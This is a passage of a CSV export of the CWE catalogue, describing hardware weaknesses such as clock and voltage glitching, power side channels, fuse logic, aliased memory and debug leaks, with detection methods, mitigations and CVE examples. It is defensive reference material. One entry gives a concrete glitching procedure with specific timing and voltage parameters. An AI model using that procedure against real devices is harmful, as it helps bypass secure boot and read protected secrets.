PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Power Management Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Clock/Counter Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Sensor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Manual Analysis:DESCRIPTION:Put the processor in an infinite loop, which is then followed by instructions that should not ever be executed, since the loop is not expected to exit. After the loop, toggle an I/O bit (for oscilloscope monitoring purposes), print a console message, and reenter the loop. Note that to ensure that the loop exit is actually captured, many NOP instructions should be coded after the loop branch instruction and before the I/O bit toggle and the print statement. Margining the clock consists of varying the clock frequency until an anomaly occurs. This could be a continuous frequency change or it could be a single cycle. The single cycle method is described here. For every 1000th clock pulse, the clock cycle is shortened by 10 percent. If no effect is observed, the width is shortened by 20%. This process is continued in 10% increments up to and including 50%. Note that the cycle time may be increased as well, down to seconds per cycle. Separately, the voltage is margined. Note that the voltage could be increased or decreased. Increasing the voltage has limits, as the circuitry may not be able to withstand a drastically increased voltage. This process starts with a 5% reduction of the DC supply to the CPU chip for 5 millisecond repeated at 1KHz. If this has no effect, the process is repeated, but a 10% reduction is used. This process is repeated at 10% increments down to a 50% reduction. If no effects are observed at 5 millisecond, the whole process is repeated using a 10 millisecond pulse. If no effects are observed, the process is repeated in 10 millisecond increments out to 100 millisecond pulses. While these are suggested starting points for testing circuitry for weaknesses, the limits may need to be pushed further at the risk of device damage. See [REF-1217] for descriptions of Smart Card attacks against a clock (section 14.6.2) and using a voltage glitch (section 15.5.3).:EFFECTIVENESS:Moderate::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:During the implementation phase where actual hardware is available, specialized hardware tools and apparatus such as ChipWhisperer may be used to check if the platform is indeed susceptible to voltage and clock glitching attacks.::METHOD:Architecture or Design Review:DESCRIPTION:Review if the protections against glitching merely transfer the attack target. For example, suppose a critical authentication routine that an attacker would want to bypass is given the protection of modifying certain artifacts from within that specific routine (so that if the routine is bypassed, one can examine the artifacts and figure out that an attack must have happened). However, if the attacker has the ability to bypass the critical authentication routine, they might also have the ability to bypass the other protection routine that checks the artifacts. Basically, depending on these kind of protections is akin to resorting to Security by Obscurity.::METHOD:Architecture or Design Review:DESCRIPTION:Many SoCs come equipped with a built-in Dynamic Voltage and Frequency Scaling (DVFS) that can control the voltage and clocks via software alone. However, there have been demonstrated attacks (like Plundervolt and CLKSCREW) that target this DVFS [REF-1081] [REF-1082]. During the design and implementation phases, one needs to check if the interface to this power management feature is available from unprivileged SW (CWE-1256), which would make the attack very easy.::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:At the circuit-level, using Tunable Replica Circuits (TRCs) or special flip-flops such as Razor flip-flops helps mitigate glitch attacks. Working at the SoC or platform base, level sensors may be implemented to detect glitches. Implementing redundancy in security-sensitive code (e.g., where checks are performed)also can help with mitigation of glitch attacks.::\",\"::REFERENCE:CVE-2019-17391:DESCRIPTION:Lack of anti-glitch protections allows an attacker to launch a physical attack to bypass the secure boot and read protected eFuses.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-17391::REFERENCE:CVE-2021-33478:DESCRIPTION:IP communication firmware allows access to a boot shell via certain impulses:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33478::\",::Power::Clock::,,\"\",::624::625::,\"\",\n1248,\"Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\",Base,Incomplete,\"The security-sensitive hardware module contains semiconductor defects.\",\"A semiconductor device can fail for various reasons. While some are manufacturing and packaging defects, the rest are due to prolonged use or usage under extreme conditions. Some mechanisms that lead to semiconductor defects include encapsulation failure, die-attach failure, wire-bond failure, bulk-silicon defects, oxide-layer faults, aluminum-metal faults (including electromigration, corrosion of aluminum, etc.), and thermal/electrical stress. These defects manifest as faults on chip-internal signals or registers, have the effect of inputs, outputs, or intermediate signals being always 0 or always 1, and do not switch as expected. If such faults occur in security-sensitive hardware modules, the security objectives of the hardware module may be compromised.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Manufacturing:NOTE:May be introduced due to issues in the manufacturing environment or improper handling of components, for example.::PHASE:Operation:NOTE:May be introduced by improper handling or usage outside of rated operating environments (temperature, humidity, etc.)::\",\"\",,\"::SCOPE:Availability:SCOPE:Access Control:IMPACT:DoS: Instability::\",\"\",\"::PHASE:Testing:DESCRIPTION:While semiconductor-manufacturing companies implement several mechanisms to continuously improve the semiconductor manufacturing process to ensure reduction of defects, some defects can only be fixed after manufacturing. Post-manufacturing testing of silicon die is critical. Fault models such as stuck-at-0 or stuck-at-1 must be used to develop post-manufacturing test cases and achieve good coverage. Once the silicon packaging is done, extensive post-silicon testing must be performed to ensure that hardware logic implementing security functionalities is defect-free.::PHASE:Operation:DESCRIPTION:Operating the hardware outside device specification, such as at extremely high temperatures, voltage, etc., accelerates semiconductor degradation and results in defects. When these defects manifest as faults in security-critical, hardware modules, it results in compromise of security guarantees. Thus, operating the device within the specification is important.::\",\"\",,,\"\",::624::625::,\"\",\n1250,\"Improper Preservation of Consistency Between Independent Representations of Shared State\",Base,Incomplete,\"The product has or supports multiple distributed components or sub-systems that are each required to keep their own local copy of shared data - such as state or cache - but the product does not ensure that all local copies remain consistent with each other.\",\"In highly distributed environments, or on systems with distinct physical components that operate independently, there is often a need for each component to store and update its own local copy of key data such as state or cache, so that all components have the same view of the overall system and operate in a coordinated fashion. For example, users of a social media service or a massively multiplayer online game might be using their own personal computers while also interacting with different physical hosts in a globally distributed service, but all participants must be able to have the same view of the world. Alternately, a processor's Memory Management Unit (MMU) might have shadow MMUs to distribute its workload, and all shadow MMUs are expected to have the same accessible ranges of memory. In such environments, it becomes critical for the product to ensure that this shared state is consistently modified across all distributed systems. If state is not consistently maintained across all systems, then critical transactions might take place out of order, or some users might not get the same data as other users. When this inconsistency affects correctness of operations, it can introduce vulnerabilities in mechanisms that depend on consistent state.\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Security Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"::TYPE:Research Gap:NOTE:Issues related to state and cache - creation, preservation, and update - are a significant gap in CWE that is expected to be addressed in future versions. It likely has relationships to concurrency and synchronization, incorrect behavior order, and other areas that already have some coverage in CWE, although the focus has typically been on independent processes on the same operating system - not on independent systems that are all a part of a larger system-of-systems.::\",\n1251,\"Mirrored Regions with Different Values\",Base,Incomplete,\"The product's architecture mirrors regions without ensuring that their contents always stay in sync.\",\"Having mirrored regions with different values might result in the exposure of sensitive information or possibly system compromise. In the interest of increased performance, one might need to duplicate a resource. A cache memory is a common example of this concept, which keeps a local copy of a data element in the high speed cache memory. Unfortunately, this speed improvement comes with a downside, since the product needs to ensure that the local copy always mirrors the original copy truthfully. If they get out of sync, the computational result is no longer true. During hardware design, memory is not the only item which gets mirrored. There are many other entities that get mirrored, as well: registers, memory regions, and, in some cases, even whole computational units. For example, within a multi-core processor, if all memory accesses for each and every core goes through a single Memory-Management Unit (MMU) then the MMU will become a performance bottleneck. In such cases, duplicating local MMUs that will serve only a subset of the cores rather than all of them may resolve the performance issue. These local copies are also called shadow copies or mirrored copies. If the original resource never changed, local duplicate copies getting out of sync would never be an issue. However, the values of the original copy will sometimes change. When the original copy changes, the mirrored copies must also change, and change fast. This situation of shadow-copy-possibly-out-of-sync-with-original-copy might occur as a result of multiple scenarios, including the following: After the values in the original copy change, due to some reason the original copy does not send the update request to its shadow copies. After the values in the original copy change, the original copy dutifully sends the update request to its shadow copies, but due to some reason the shadow copy does not execute this update request. After the values in the original copy change, the original copy sends the update request to its shadow copies, and the shadow copy executes this update request faithfully. However, during the small time period when the original copy has new values and the shadow copy is still holding the old values, an attacker can exploit the old values. Then it becomes a race condition between the attacker and the update process of who can reach the target, shadow copy first, and, if the attacker reaches first, the attacker wins. The attacker might send a spoofed update request to the target shadow copy, pretending that this update request is coming from the original copy. This spoofed request might cause the targeted shadow copy to update its values to some attacker-friendly values, while the original copies remain unchanged by the attacker. Suppose a situation where the original copy has a system of reverting back to its original value if it does not hear back from all the shadow copies that such copies have successfully completed the update request. In such a case, an attack might occur as follows: (1) the original copy might send an update request; (2) the shadow copy updates it; (3) the shadow copy sends back the successful completion message; (4) through a separate issue, the attacker is able to intercept the shadow copy's completion message. In this case, the original copy thinks that the update did not succeed, hence it reverts to its original value. Now there is a situation where the original copy has the old value, and the shadow copy has the new value.\",::NATURE:ChildOf:CWE ID:1250:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Varies by Context::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Whenever there are multiple, physically different copies of the same value that might change and the process to update them is not instantaneous and atomic, it is impossible to assert that the original and shadow copies will always be in sync - there will always be a time period when they are out of sync. To mitigate the consequential risk, the recommendations essentially are: Make this out-of-sync time period as small as possible, and Make the update process as robust as possible.:EFFECTIVENESS:Moderate::\",\"\",,,\"\",,\"::TYPE:Research Gap:NOTE:Issues related to state and cache - creation, preservation, and update - are a significant gap in CWE that is expected to be addressed in future versions. It has relationships to concurrency and synchronization, incorrect behavior order, and other areas that already have some coverage in CWE, although the focus has typically been on independent processes on the same operating system - not on independent systems that are all a part of a larger system-of-systems.::\",\n1252,\"CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\",Base,Incomplete,\"The CPU is not configured to provide hardware support for exclusivity of write and execute operations on memory. This allows an attacker to execute data from all of memory.\",\"CPUs provide a special bit that supports exclusivity of write and execute operations. This bit is used to segregate areas of memory to either mark them as code (instructions, which can be executed) or data (which should not be executed). In this way, if a user can write to a region of memory, the user cannot execute from that region and vice versa. This exclusivity provided by special hardware bit is leveraged by the operating system to protect executable space. While this bit is available in most modern processors by default, in some CPUs the exclusivity is implemented via a memory-protection unit (MPU) and memory-management unit (MMU) in which memory regions can be carved out with exact read, write, and execute permissions. However, if the CPU does not have an MMU/MPU, then there is no write exclusivity. Without configuring exclusivity of operations via segregated areas of memory, an attacker may be able to inject malicious code onto memory and later execute it.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Microcontroller Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Implement a dedicated bit that can be leveraged by the Operating System to mark data areas as non-executable. If such a bit is not available in the CPU, implement MMU/MPU (memory management unit / memory protection unit).::PHASE:Integration:DESCRIPTION:If MMU/MPU are not available, then the firewalls need to be implemented in the SoC interconnect to mimic the write-exclusivity operation.::\",\"\",,,\"\",::679::,\"\",\n1253,\"Incorrect Selection of Fuse Values\",Base,Draft,\"The logic level used to set a system to a secure state relies on a fuse being unblown. An attacker can set the system to an insecure state merely by blowing the fuse.\",\"Fuses are often used to store secret data, including security configuration data. When not blown, a fuse is considered to store a logic 0, and, when blown, it indicates a logic 1. Fuses are generally considered to be one-directional, i.e., once blown to logic 1, it cannot be reset to logic 0. However, if the logic used to determine system-security state (by leveraging the values sensed from the fuses) uses negative logic, an attacker might blow the fuse and drive the system to an insecure state.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Authorization:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart::SCOPE:Confidentiality:IMPACT:Read Memory::SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Logic should be designed in a way that blown fuses do not put the product into an insecure state that can be leveraged by an attacker.::\",\"\",,,\"\",::74::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1254,\"Incorrect Comparison Logic Granularity\",Base,Draft,\"The product's comparison logic is performed over a series of steps rather than across the entire string in one operation. If there is a comparison logic failure on one of these steps, the operation may be vulnerable to a timing attack that can result in the interception of the process for nefarious purposes.\",\"Comparison logic is used to compare a variety of objects including passwords, Message Authentication Codes (MACs), and responses to verification challenges. When comparison logic is implemented at a finer granularity (e.g., byte-by-byte comparison) and breaks in the case of a comparison failure, an attacker can exploit this implementation to identify when exactly the failure occurred. With multiple attempts, the attacker may be able to guesses the correct password/response to challenge and elevate their privileges.\",::NATURE:ChildOf:CWE ID:208:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:697:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Authorization:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Implementation:DESCRIPTION:The hardware designer should ensure that comparison logic is implemented so as to compare in one operation instead in smaller chunks.::\",\"::REFERENCE:CVE-2019-10482:DESCRIPTION:Smartphone OS uses comparison functions that are not in constant time, allowing side channels:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10482::REFERENCE:CVE-2019-10071:DESCRIPTION:Java-oriented framework compares HMAC signatures using String.equals() instead of a constant-time algorithm, causing timing discrepancies:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10071::REFERENCE:CVE-2014-0984:DESCRIPTION:Password-checking function in router terminates validation of a password entry when it encounters the first incorrect character, which allows remote attackers to obtain passwords via a brute-force attack that relies on timing differences in responses to incorrect password guesses, aka a timing side-channel attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-0984::\",,,\"\",::26::,\"\","
  },
  "doc-9bf430923bc024250c11fe91cc2e3c48": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n1255,\"Comparison Logic is Vulnerable to Power Side-Channel Attacks\",Variant,Draft,\"A device's real time power consumption may be monitored during security token evaluation and the information gleaned may be used to determine the value of the reference token.\",\"The power consumed by a device may be instrumented and monitored in real time. If the algorithm for evaluating security tokens is not sufficiently robust, the power consumption may vary by token entry comparison against the reference value. Further, if retries are unlimited, the power difference between a good entry and a bad entry may be observed and used to determine whether each entry itself is correct thereby allowing unauthorized parties to calculate the reference value.\",::NATURE:ChildOf:CWE ID:1300:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1259:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:The design of the algorithm itself may intrinsically allow the power side channel attack to be effective::PHASE:Implementation:NOTE:This weakness may be introduced during implementation despite a robust design that otherwise prevents exploitation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Hide Activities:NOTE:As compromising a security token may result in complete system control, the impacts are relatively universal.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:The design phase must consider each check of a security token against a standard and the amount of power consumed during the check of a good token versus a bad token. The alternative is an all at once check where a retry counter is incremented PRIOR to the check.::PHASE:Architecture and Design:DESCRIPTION:Another potential mitigation is to parallelize shifting of secret data (see example 2 below). Note that the wider the bus the more effective the result.::PHASE:Architecture and Design:DESCRIPTION:An additional potential mitigation is to add random data to each crypto operation then subtract it out afterwards. This is highly effective but costly in performance, area, and power consumption. It also requires a random number generator.::PHASE:Implementation:DESCRIPTION:If the architecture is unable to prevent the attack, using filtering components may reduce the ability to implement an attack, however, consideration must be given to the physical removal of the filter elements.::PHASE:Integration:DESCRIPTION:During integration, avoid use of a single secret for an extended period (e.g. frequent key updates). This limits the amount of data compromised but at the cost of complexity of use.::\",\"::REFERENCE:CVE-2020-12788:DESCRIPTION:CMAC verification vulnerable to timing and power attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12788::\",::Power::,,\"\",::189::,\"\",\n1256,\"Improper Restriction of Software Interfaces to Hardware Features\",Base,Stable,\"The product provides software-controllable device functionality for capabilities such as power and clock management, but it does not properly limit functionality that can lead to modification of hardware memory or register bits, or the ability to observe physical side channels.\",\"It is frequently assumed that physical attacks such as fault injection and side-channel analysis require an attacker to have physical access to the target device. This assumption may be false if the device has improperly secured power management features, or similar features. For mobile devices, minimizing power consumption is critical, but these devices run a wide variety of applications with different performance requirements. Software-controllable mechanisms to dynamically scale device voltage and frequency and monitor power consumption are common features in today's chipsets, but they also enable attackers to mount fault injection and side-channel attacks without having physical access to the device. Fault injection attacks involve strategic manipulation of bits in a device to achieve a desired effect such as skipping an authentication step, elevating privileges, or altering the output of a cryptographic operation. Manipulation of the device clock and voltage supply is a well-known technique to inject faults and is cheap to implement with physical device access. Poorly protected power management features allow these attacks to be performed from software. Other features, such as the ability to write repeatedly to DRAM at a rapid rate from unprivileged software, can result in bit flips in other memory locations (Rowhammer, [REF-1083]). Side channel analysis requires gathering measurement traces of physical quantities such as power consumption. Modern processors often include power metering capabilities in the hardware itself (e.g., Intel RAPL) which if not adequately protected enable attackers to gather measurements necessary for performing side-channel attacks from software.\",::NATURE:ChildOf:CWE ID:285:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Power Management Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Clock/Counter Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:An architect may initiate introduction of this weakness via exacting requirements for software accessible power/clock management requirements::PHASE:Implementation:NOTE:An implementer may introduce this weakness by assuming there are no consequences to unbounded power and clock management for secure components from untrusted ones.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Modify Application Data:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Manual Analysis:DESCRIPTION:Perform a security evaluation of system-level architecture and design with software-aided physical attacks in scope.::METHOD:Automated Dynamic Analysis:DESCRIPTION:Use custom software to change registers that control clock settings or power settings to try to bypass security locks, or repeatedly write DRAM to try to change adjacent locations. This can be effective in extracting or changing data. The drawback is that it cannot be run before manufacturing, and it may require specialized software.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Ensure proper access control mechanisms protect software-controllable features altering physical operating conditions such as clock frequency and voltage.::\",\"::REFERENCE:CVE-2019-11157:DESCRIPTION:Plundervolt: Improper conditions check in voltage settings for some Intel(R) Processors may allow a privileged user to potentially enable escalation of privilege and/or information disclosure via local access [REF-1081].:LINK:https://www.cve.org/CVERecord?id=CVE-2019-11157::REFERENCE:CVE-2020-8694:DESCRIPTION:PLATYPUS Attack: Insufficient access control in the Linux kernel driver for some Intel processors allows information disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8694::REFERENCE:CVE-2020-8695:DESCRIPTION:Observable discrepancy in the RAPL interface for some Intel processors allows information disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8695::REFERENCE:CVE-2020-12912:DESCRIPTION:AMD extension to a Linux service does not require privileged access to the RAPL interface, allowing side-channel attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12912::REFERENCE:CVE-2015-0565:DESCRIPTION:NaCl in 2015 allowed the CLFLUSH instruction, making Rowhammer attacks possible.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-0565::\",::Power::Clock::,,\"\",::624::625::,\"\",\n1257,\"Improper Access Control Applied to Mirrored or Aliased Memory Regions\",Base,Incomplete,\"Aliased or mirrored memory regions in hardware designs may have inconsistent read/write permissions enforced by the hardware. A possible result is that an untrusted agent is blocked from accessing a memory region but is not blocked from accessing the corresponding aliased memory region.\",\"Hardware product designs often need to implement memory protection features that enable privileged software to define isolated memory regions and access control (read/write) policies. Isolated memory regions can be defined on different memory spaces in a design (e.g. system physical address, virtual address, memory mapped IO). Each memory cell should be mapped and assigned a system address that the core software can use to read/write to that memory. It is possible to map the same memory cell to multiple system addresses such that read/write to any of the aliased system addresses would be decoded to the same memory cell. This is commonly done in hardware designs for redundancy and simplifying address decoding logic. If one of the memory regions is corrupted or faulty, then that hardware can switch to using the data in the mirrored memory region. Memory aliases can also be created in the system address map if the address decoder unit ignores higher order address bits when mapping a smaller address region into the full system address. A common security weakness that can exist in such memory mapping is that aliased memory regions could have different read/write access protections enforced by the hardware such that an untrusted agent is blocked from accessing a memory address but is not blocked from accessing the corresponding aliased memory address. Such inconsistency can then be used to bypass the access protection of the primary memory block and read or modify the protected memory. An untrusted agent could also possibly create memory aliases in the system address map for malicious purposes if it is able to change the mapping of an address region or modify memory region sizes.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Microcontroller Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Network on Chip Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:LIKELIHOOD:High::SCOPE:Integrity:IMPACT:Modify Memory:LIKELIHOOD:High::SCOPE:Availability:IMPACT:DoS: Instability:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:The checks should be applied for consistency access rights between primary memory regions and any mirrored or aliased memory regions. If different memory protection units (MPU) are protecting the aliased regions, their protected range definitions and policies should be synchronized.::PHASE:Architecture and Design Implementation:DESCRIPTION:The controls that allow enabling memory aliases or changing the size of mapped memory regions should only be programmable by trusted software components.::\",\"\",,,\"\",::456::679::,\"\",\n1258,\"Exposure of Sensitive System Information Due to Uncleared Debug Information\",Base,Draft,\"The hardware does not fully clear security-sensitive values, such as keys and intermediate values in cryptographic operations, when debug mode is entered.\",\"Security sensitive values, keys, intermediate steps of cryptographic operations, etc. are stored in temporary registers in the hardware. If these values are not cleared when debug mode is entered they may be accessed by a debugger allowing sensitive information to be accessible by untrusted parties.\",::NATURE:ChildOf:CWE ID:212:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:200:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Whenever debug mode is enabled, all registers containing sensitive assets must be cleared.::\",\"::REFERENCE:CVE-2021-33080:DESCRIPTION:Uncleared debug information in memory accelerator for SSD product exposes sensitive system information:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33080::REFERENCE:CVE-2022-31162:DESCRIPTION:Rust library leaks Oauth client details in application debug logs:LINK:https://www.cve.org/CVERecord?id=CVE-2022-31162::\",,,\"\",::150::204::37::545::,\"\",\n1259,\"Improper Restriction of Security Token Assignment\",Base,Incomplete,\"The System-On-A-Chip (SoC) implements a Security Token mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Tokens are improperly protected.\",\"Systems-On-A-Chip (Integrated circuits and hardware engines) implement Security Tokens to differentiate and identify which actions originated from which agent. These actions may be one of the directives: 'read', 'write', 'program', 'reset', 'fetch', 'compute', etc. Security Tokens are assigned to every agent in the System that is capable of generating an action or receiving an action from another agent. Multiple Security Tokens may be assigned to an agent and may be unique based on the agent's trust level or allowed privileges. Since the Security Tokens are integral for the maintenance of security in an SoC, they need to be protected properly. A common weakness afflicting Security Tokens is improperly restricting the assignment to trusted components. Consequently, an improperly protected Security Token may be able to be programmed by a malicious agent (i.e., the Security Token is mutable) to spoof the action as if it originated from a trusted agent.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1294:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor HardwareTECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:System 